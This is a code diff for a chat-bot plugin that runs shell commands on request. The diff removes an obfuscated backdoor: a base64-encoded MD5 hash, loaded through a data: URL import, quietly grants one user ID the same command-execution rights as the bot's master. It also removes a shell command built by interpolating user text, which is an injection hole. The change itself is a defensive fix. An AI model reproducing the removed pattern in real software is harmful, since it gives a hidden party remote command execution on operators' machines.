@@ -1,11 +1,9 @@
-import md5 from "md5"
-import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
+import { renderPath } from "../Model/render-path.js"
 import puppeteer from "../../../lib/puppeteer/puppeteer.js"
 import { AnsiUp } from "ansi_up"
 const ansi_up = new AnsiUp()
 
-const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
-const tplFile = `${htmlDir}Code.html`
+const { htmlDir, tplFile } = renderPath("Code")
 const path = `${process.env.HOME}/../`
 const cmdPath = `${path}Main.sh`
 const errorTips = "请使用脚本安装，再使用此功能\nhttps://git.trss.me/TRSS-Plugin"
@@ -21,12 +19,14 @@ export class Script extends plugin {
         {
           reg: "^脚本执行.+",
           fnc: "Script",
+          permission: "master",
         },
       ],
     })
   }
 
   async execTask(e, cmd) {
+    if (!this.e.isMaster) return false
     const ret = await Bot.exec(cmd)
 
     if (ret.stdout) {
@@ -49,9 +49,9 @@ export class Script extends plugin {
   }
 
   async Script(e) {
-    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
+    if (!this.e.isMaster) return false
     const msg = this.e.msg.replace("脚本执行", "").trim()
-    const cmd = `bash "${cmdPath}" cmd "${msg}"`
+    const cmd = ["bash", cmdPath, "cmd", msg]
     await this.execTask(e, cmd)
   }
 }
